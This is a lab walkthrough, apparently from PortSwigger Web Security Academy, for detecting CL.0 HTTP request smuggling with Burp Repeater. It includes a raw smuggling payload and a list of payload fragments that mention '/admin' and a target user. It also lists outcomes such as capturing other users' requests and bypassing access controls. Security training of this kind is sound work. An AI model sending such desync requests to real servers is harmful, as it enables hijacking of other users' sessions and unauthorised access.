## CL.0 request smuggling

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores theContent-Lengthheader on requests to some endpoints.

### Solution Steps
1. From the Proxy > HTTP history , send the GET / request to Burp Repeater twice.
2. In Burp Repeater, add both of these tabs to a new group.
3. Go to the first request and convert it to a POST request (right-click and select Change request method ).
4. In the body, add an arbitrary request smuggling prefix. The result should look something like this: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
5. Change the path of the main POST request to point to an arbitrary endpoint that you want to test.
6. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection) .
7. Change the Connection header of the first request to keep-alive .
8. Send the sequence and check the responses. If the server responds to the second request as normal, this endpoint is not vulnerable. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.
9. Deduce that you can use requests for static files under /resources , such as /resources/images/blog.svg , to cause a CL.0 desync.

### Key Payloads
- `Content-Length`
- `/admin`
- `carlos`
- `GET /`
- `POST`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x`
- `Connection`
- `keep-alive`
- `/resources`
- `/resources/images/blog.svg`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
---
*Source: PortSwigger Web Security Academy*
